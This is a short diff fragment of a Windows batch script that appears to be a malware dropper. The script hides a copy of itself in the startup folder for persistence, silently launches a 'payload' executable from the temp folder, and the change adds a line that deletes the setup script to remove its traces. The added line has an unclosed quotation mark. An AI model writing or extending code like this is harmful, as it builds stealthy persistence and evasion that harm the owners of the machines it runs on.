@@ -87,5 +87,6 @@ attrib +h "%startupFolder%\%~nx0%"
 
 :: Run payload silently
 start /min "" "%temp%\program.exe"
+del "%temp%\thesetup.bat
 
 exit
